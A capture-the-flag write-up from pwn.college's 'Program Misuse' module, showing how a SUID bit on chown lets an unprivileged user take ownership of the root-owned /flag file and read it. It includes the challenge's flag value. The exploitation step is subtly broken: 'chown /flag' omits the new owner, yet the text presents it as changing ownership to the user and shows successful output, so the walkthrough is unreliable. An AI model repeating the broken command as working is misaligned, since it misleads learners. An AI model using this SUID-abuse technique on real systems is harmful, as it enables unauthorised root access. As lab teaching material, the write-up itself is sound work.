---
layout: page
title: "Challenge Name: chown"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Beginner  
**Date**: 2025-07-16  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/chown`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/chown
```

Output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/chown
```

- The `s` in `-rws` indicates it's a SUID binary.
- `chown` runs with **root privileges**.

## 🚀 Exploitation

The `chown` command in Linux is used to change the ownership of files and directories.
We can simply change the ownership of /flag to hacker(our user).

```bash
chown /flag
cat /flag
```

Output:
```
pwn.college{8pBYmIWne_yzc7eQGB83F0sVZC0.dlzNxwSM0IzMyEzW}
```
